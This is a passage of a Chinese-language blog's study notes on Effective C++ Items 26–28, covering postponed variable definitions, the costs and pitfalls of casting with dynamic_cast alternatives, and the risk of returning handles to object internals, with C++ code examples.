encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>延后了声明时间，但是是缺省的构造函数相较于使用含参构造函数效率较低。条款4 曾解释为什么“通过default 构造<br>函数构造出一个对象然后对它赋值”比“直接在构造时指定初值”效率差。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this function postpones encrypted&#x27;s definition until it&#x27;s truly necessary</span></span><br><span class="line"><span class="function">std::string <span class="title">encryptPassword</span><span class="params">(<span class="type">const</span> std::string&amp; password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (password.<span class="built_in">length</span>() &lt; MinimumPasswordLength) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="built_in">logic_error</span>(<span class="string">&quot;Password is too short&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string encrypted;</span><br><span class="line"></span><br><span class="line">  ...                      <span class="comment">// do whatever is necessary to place an</span></span><br><span class="line">                           <span class="comment">// encrypted version of password in encrypted</span></span><br><span class="line">  <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们将构造和赋值连接起来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this function postpones encrypted&#x27;s definition until</span></span><br><span class="line"><span class="comment">// it&#x27;s necessary, but it&#x27;s still needlessly inefficient</span></span><br><span class="line"><span class="function">std::string <span class="title">encryptPassword</span><span class="params">(<span class="type">const</span> std::string&amp; password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...                                   <span class="comment">// check length as above</span></span><br><span class="line"></span><br><span class="line">  string encrypted;                     <span class="comment">// default-construct encrypted</span></span><br><span class="line">  encrypted = password;                 <span class="comment">// assign to encrypted</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">encrypt</span>(encrypted);</span><br><span class="line">  <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是推荐的方法：用 password 初始化 encrypted，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// finally, the best way to define and initialize encrypted</span></span><br><span class="line"><span class="function">std::string <span class="title">encryptPassword</span><span class="params">(<span class="type">const</span> std::string&amp; password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...                                     <span class="comment">// check length</span></span><br><span class="line"></span><br><span class="line">  <span class="function">string <span class="title">encrypted</span><span class="params">(password)</span></span>;             <span class="comment">// define and initialize</span></span><br><span class="line">                                          <span class="comment">// via copy constructor</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">encrypt</span>(encrypted);</span><br><span class="line">  <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这让我们联想起本条款所谓“尽可能延后”的真正意义。你<code>不只应该延后变量的定义，直到非得使用该变量的前一刻为止，甚至应该尝试延后这份定义直到能够给它初值实参为止</code>。如果这样，不仅能够避免构造（和析构）非必要对象，还可以避免无意义的default 构造行为。更深一层说，以“具明显意义之初值”将变量初始化，还可以附带说明变量的目的。</p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Approach A: define outside loop   // Approach B: define inside loop</span></span><br><span class="line"></span><br><span class="line">Widget w;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;         <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">  w = some value dependent on i;       <span class="function">Widget <span class="title">w</span><span class="params">(some value dependent on i)</span></span>;</span><br><span class="line">  ...                                  ...</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>方法 A：1 个构造函数 + 1 个析构函数 + n 个赋值。</p><p>方法 B：n 个构造函数 + n 个析构函数。</p><p>如果classes 的一个赋值成本低千一组构造＋析构成本，做法A 大体而言比较高效。尤其当n 值很大的时候。否则做法B 或许较好。此外做法A 造成名称w 的<code>作用域</code>（覆盖整个循环）比做法B 更大，有时那对程序的可理解性和易维护性造成冲突。因此除非</p><ol><li>你知道赋值成本比“构造＋析构”成本低。</li><li>你正在处理代码中效率高度敏感C performance-sensitive) 的部分，否则你应该使用做法B 。</li></ol><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>尽可能延后变量定义式的出现。这样做可增加程序的清晰度并改善程序效率。</li></ul><h3 id="27-Minimize-casting"><a href="#27-Minimize-casting" class="headerlink" title="27. Minimize casting"></a>27. Minimize casting</h3><h4 id="三种不同形式的转型"><a href="#三种不同形式的转型" class="headerlink" title="三种不同形式的转型"></a>三种不同形式的转型</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(T)expression<span class="comment">//C风格</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">T</span>(expression)<span class="comment">//函数风格</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//cpp的四大转型</span></span><br><span class="line"><span class="built_in">const_cast</span>&lt;T&gt; (expression)    <span class="comment">//对象的常量性移除</span></span><br><span class="line"><span class="built_in">dynamic_cast</span>&lt;T&gt; (expression)<span class="comment">//执行安全的向下转型，这种转换要求至少有一个类含有虚函数，用于支持运行时类型识别（RTTI）。</span></span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;T&gt; (expression)<span class="comment">//低级转型，允许几乎任何指针之间的转换，以及指针与足够大的整数类型之间的转换。</span></span><br><span class="line"><span class="built_in">static_cast</span>&lt;T&gt; (expression)<span class="comment">//强迫隐式转换，基本数据类型之间的转换（如整数和浮点数）、将指针向上转换至继承层次中的基类（不进行运行时类型检查）、以及调用用户定义的转换函数。</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>许多程序员相信，转型其实什么都没做，只是告诉编译器把某种类型视为另一种类型。这是错误的观念。</code>请看如下实现了多重继承：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> &#123; <span class="keyword">public</span>: <span class="type">int</span> b1; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;&#125; <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;&#125; <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;&#125; &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span> &#123; <span class="keyword">public</span>: <span class="type">int</span> b2; &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base1, <span class="keyword">public</span> Base2 &#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Derived d;</span><br><span class="line">Base1* pb1 = &amp;d;  <span class="comment">// 指向 Derived 对象的开始</span></span><br><span class="line">Base2* pb2 = &amp;d;  <span class="comment">// 需要调整偏移量以正确指向 Derived 中的 Base2 部分</span></span><br><span class="line">cout &lt;&lt; &amp;d &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; pb1 &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; pb2 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00000022</span>C70FF730</span><br><span class="line"><span class="number">00000022</span>C70FF730</span><br><span class="line"><span class="number">00000022</span>C70FF740</span><br></pre></td></tr></table></figure><p>pb2的地址比pb1和&amp;d的地址多16，即一个<code>int加上虚函数指针</code>4+8=12（<code>内存对齐</code>使得其为16），但是普通函数并不占用此内存布局，多个虚函数只需要一个虚指针。</p><p>注意，对象的布局和地址的计算方式随编译器的不同而不同。</p><h4 id="不要对this指针进行转型"><a href="#不要对this指针进行转型" class="headerlink" title="不要对this指针进行转型"></a>不要对this指针进行转型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Window &#123;                                // base class</span><br><span class="line">public:</span><br><span class="line">  virtual void onResize() &#123; ... &#125;             // base onResize impl</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class SpecialWindow: public Window &#123;          // derived class</span><br><span class="line">public:</span><br><span class="line">  virtual void onResize() &#123;                   // derived onResize impl;</span><br><span class="line">    static_cast&lt;Window&gt;(*this).onResize();    // cast *this to Window,</span><br><span class="line">                                              // then call its onResize;</span><br><span class="line">                                              // this doesn&#x27;t work!</span><br><span class="line">    ...                                       // do SpecialWindow-</span><br><span class="line">  &#125;                                           // specific stuff</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>强制转型创建了一个* this 的<code>基类部分的新的临时的拷贝</code>，然后调用这个拷贝的 onResize！</p><p>它是在“当前对象之base class 成分”的副本上调用window: :onResize, 然后在当前对象身上执行Special window 专属动作。导致的境况是那些代码使当前对象进入一种病态，没有做基类的变更，却做了派生类的变更。</p><p>正确做法，你应该调用当前对象的基类版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class SpecialWindow: public Window &#123;</span><br><span class="line">public:</span><br><span class="line">  virtual void onResize() &#123;</span><br><span class="line">    Window::onResize();                    // call Window::onResize</span><br><span class="line">    ...                                    // on *this</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个例子也表明如果你发现自己要做强制转型，这就是你可能做错了某事的一个信号。在你想用 dynamic_cast 时尤其如此。</p><h4 id="dynamic-cast"><a href="#dynamic-cast" class="headerlink" title="dynamic_cast"></a>dynamic_cast</h4><ul><li><code>dynamic_cast</code> 的实现依赖于 RTTI 机制。RTTI 会在每个对象中存储有关对象类型的信息，包括虚函数表（vtable）等。在运行时，<code>dynamic_cast</code> 使用这些信息来进行类型检查。</li><li>我们为什么需要dynamic_cast：在我们只有基类指针的情况下，在我认定为的derived class对象上执行对应的操作。如：我们有一个指向基类人的指针，有两个派生类：敌人和人质。故我们需要判断，敌人就kiil掉，人质则保护他。我们可不能像<code>俄式救援</code>那样，不分敌我。</li></ul><p>同时，有两种方式可以避免使用dynamic_cast:</p><ol><li>使用存储着直接指向派生类对象的指针（通常是智能指针——参见 Item 13）的容器，从而消除通过基类接口操控这个对象的需要。如设计一个敌人容器和人质容器。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123; </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">const</span> <span class="type">int</span>&amp; x)</span><br><span class="line">        :<span class="built_in">m_name</span>(x)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;看到了:&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">Getname</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_name;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">enemy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">kill</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;成功击杀敌人:&quot;</span> &lt;&lt; <span class="built_in">Getname</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hostage</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">protect</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;成功保护人质:&quot;</span> &lt;&lt; <span class="built_in">Getname</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> std::vector&lt;std::shared_ptr&lt;enemy&gt; &gt; Enemy_vector;</span><br><span class="line"><span class="keyword">typedef</span> std::vector&lt;std::shared_ptr&lt;hostage&gt; &gt; Hostage_vector;</span><br><span class="line"><span class="comment">// see Item 13 for info on std::shared_ptr</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Enemy_vector e;</span><br><span class="line">    e.<span class="built_in">push_back</span>(std::<span class="built_in">make_shared</span>&lt;enemy&gt;(<span class="number">1</span>));</span><br><span class="line">    e.<span class="built_in">push_back</span>(std::<span class="built_in">make_shared</span>&lt;enemy&gt;(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    Hostage_vector h;</span><br><span class="line">    h.<span class="built_in">push_back</span>(std::<span class="built_in">make_shared</span>&lt;hostage&gt;(<span class="number">3</span>));</span><br><span class="line">    h.<span class="built_in">push_back</span>(std::<span class="built_in">make_shared</span>&lt;hostage&gt;(<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = e.<span class="built_in">begin</span>(); it != e.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        (*it)-&gt;<span class="built_in">kill</span>(); <span class="comment">// 通过迭代器访问对象的成员函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = h.<span class="built_in">begin</span>(); it != h.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        (*it)-&gt;<span class="built_in">protect</span>(); <span class="comment">// 通过迭代器访问对象的成员函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在base class内提供virtual 函数做你想对各个派生类做的事，通过缺省实现。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Person</span>(<span class="type">int</span> x) : <span class="built_in">m_name</span>(x) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;创建 Person：&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Person</span>() &#123;&#125;  <span class="comment">// 确保使用多态基类时有一个虚析构函数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getName</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">action</span><span class="params">()</span> </span>= <span class="number">0</span>;  <span class="comment">// 统一接口为 action</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Enemy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Enemy</span>(<span class="type">int</span> x) : <span class="built_in">Person</span>(x) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">action</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;成功击杀敌人：&quot;</span> &lt;&lt; <span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hostage</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Hostage</span>(<span class="type">int</span> x) : <span class="built_in">Person</span>(x) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">action</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;成功保护人质：&quot;</span> &lt;&lt; <span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> std::vector&lt;std::shared_ptr&lt;Person&gt;&gt; PersonVector;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PersonVector p;</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="built_in">make_shared</span>&lt;Enemy&gt;(<span class="number">1</span>));</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="built_in">make_shared</span>&lt;Enemy&gt;(<span class="number">2</span>));</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="built_in">make_shared</span>&lt;Hostage&gt;(<span class="number">3</span>));</span><br><span class="line">    p.<span class="built_in">push_back</span>(<span class="built_in">make_shared</span>&lt;Hostage&gt;(<span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; person : p) &#123;</span><br><span class="line">        person-&gt;<span class="built_in">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>如果可以，尽量避免转型，特别是在注重效率的代码中避免dynarnic_cast 。</li><li>如果有个设计需要转型动作，试着发展无需转型的替代设计。</li><li>如果转型是必要的，试着将它隐藏于某个函数背后。客户随后可以调用该函数，而不需将转型放进他们自己的代码内。</li><li>宁可使用C++-style （新式）转型，不要使用旧式转型。前者很容易辨识出来，而且也比较有着分门别类的职掌。</li></ul><h3 id="28-Avoid-returning-“handles”-to-object-internals"><a href="#28-Avoid-returning-“handles”-to-object-internals" class="headerlink" title="28. Avoid returning “handles” to object internals"></a>28. Avoid returning “handles” to object internals</h3><p>//TODO</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;                      <span class="comment">// class for representing points</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Point</span>(<span class="type">int</span> x, <span class="type">int</span> y);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setX</span><span class="params">(<span class="type">int</span> newVal)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setY</span><span class="params">(<span class="type">int</span> newVal)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">RectData</span> &#123;                    <span class="comment">// Point data for a Rectangle</span></span><br><span class="line">  Point ulhc;                        <span class="comment">// ulhc = &quot; upper left-hand corner&quot;</span></span><br><span class="line">  Point lrhc;                        <span class="comment">// lrhc = &quot; lower right-hand corner&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">Point&amp; <span class="title">upperLeft</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> pData-&gt;ulhc; &#125;</span><br><span class="line">  <span class="function">Point&amp; <span class="title">lowerRight</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> pData-&gt;lrhc; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::shared_ptr&lt;RectData&gt; pData;          <span class="comment">// see Item 13 for info on</span></span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Point <span class="title">coord1</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function">Point <span class="title">coord2</span><span class="params">(<span class="number">100</span>, <span class="number">100</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> Rectangle <span class="title">rec</span><span class="params">(coord1, coord2)</span></span>;     <span class="comment">// rec is a const rectangle from</span></span><br><span class="line">                                         <span class="comment">// (0, 0) to (100, 100)</span></span><br><span class="line"></span><br><span class="line">rec.<span class="built_in">upperLeft</span>().<span class="built_in">setX</span>(<span class="number">50</span>);                <span class="comment">// now rec goes from</span></span><br><span class="line">                                         <span class="comment">// (50, 0) to (100, 100)!</span></span><br></pre></td></tr></table></figure><ul><li>upperLeft 的调用者能够使用被返回的reference （指向rec 内部的Point 成员变量）来更改成员。</li><li>第一，成员变量的封装性最多只等于“返回其reference” 的函数的访问级别。本例之中虽然ulhc 和lrhc 都被声明为private,它们实际上却是public。</li><li>第二，如果const 成员函数传出一个reference, 后者所指数据与对象自身有关联，而它又被存储于对象之外，那么这个函数的调用者可以修改那笔数据。这正是<code>bitwise constness</code> 的一个附带结果，见条款3 。</li></ul><p>我们通过将返回值修改为const来防止修改对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">const</span> Point&amp; <span class="title">upperLeft</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> pData-&gt;ulhc;&#125;</span><br><span class="line"><span class="function"><span class="type">const</span> Point&amp; <span class="title">lowerRight</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> pData-&gt;lrhc; &#125;</span><br><span 